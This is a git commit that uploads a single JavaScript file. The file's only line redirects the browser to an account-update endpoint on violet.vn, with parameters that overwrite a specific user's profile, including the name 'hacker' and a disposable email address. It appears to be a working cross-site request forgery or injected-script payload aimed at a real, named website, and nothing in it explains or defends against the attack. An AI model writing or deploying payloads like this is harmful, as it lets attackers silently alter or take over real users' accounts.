5b504053959d246fdc02773a918810c8f3df5214
bluesky96 <sanhphanvan961@gmail.com>
2017-08-10 17:21:39 +0700

    Add files via upload

---
+++ 312614.js
@@ -0,0 +1,1 @@
+document.location = "http://violet.vn/main/user/update?user_id=312614&fullname=hacker&us_sex=1&ci_day=1&ci_month=1&ci_year=1970&ci_idnumber=209312614&us_email=312614%40yopmail.com&us_phone=&ci_pr=&us_avatar=&ci_position=1&ci_province=1868&badge1=0&badge2=0&badge3=0&ci_subject=&ci_userid=312614"
